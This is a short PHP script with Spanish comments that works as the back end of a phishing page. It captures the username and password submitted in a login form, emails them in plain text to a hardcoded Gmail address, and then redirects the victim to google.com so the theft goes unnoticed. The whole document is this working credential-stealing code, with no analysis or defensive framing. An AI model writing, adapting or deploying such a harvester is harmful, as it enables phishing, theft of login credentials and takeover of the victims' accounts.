<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Configuración de correo
    $to = "miquigisebar@gmail.com";
    $subject = "Datos de inicio de sesión";
    $message = "Usuario: " . $username . "\nContraseña: " . $password;
    $headers = "From: miquigisebar@gmail.com"; // Reemplaza con tu dirección de correo

    // Envío de correo
    if (mail($to, $subject, $message, $headers)) {
        echo "Correo enviado correctamente.";
        header("Location: https://www.google.com");
        exit(); // Asegura que el script se detenga después de la redirección
    } else {
        echo "Hubo un error al enviar el correo.";
    }
}
?>
